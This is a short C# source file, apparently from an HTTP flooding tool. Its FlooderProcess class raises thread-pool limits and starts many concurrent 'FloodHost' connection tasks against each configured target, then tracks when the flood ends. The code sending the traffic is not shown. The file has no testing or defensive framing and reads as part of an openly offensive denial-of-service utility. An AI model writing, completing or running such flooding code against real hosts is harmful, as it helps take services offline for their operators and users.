internal class FlooderProcess
{
    private readonly Configuration _configuration;
    private readonly List<Task> _tasks;

    private bool _isFlooding;
    public bool IsFlooding { get => _isFlooding; }// ThreadPool.PendingWorkItemCount > 0; }

    public FlooderProcess(Configuration configuration)
    {
        _configuration = configuration;
        _tasks = new List<Task>();
    }

    public void BeginFlood()
    {
        ThreadPool.SetMaxThreads(_configuration.threadCount, _configuration.ioThreadCount);
        foreach (TargetInfo target in _configuration.targets)
        {
            for (int i = 0; i < target.concurrency; i++)
            {
                _tasks.Add(new LimitedHttpConnection(target).FloodHost());
            }
        }
        _isFlooding = true;
        Task.WhenAll(_tasks.ToArray()).ContinueWith(t => _isFlooding = false);
    }
}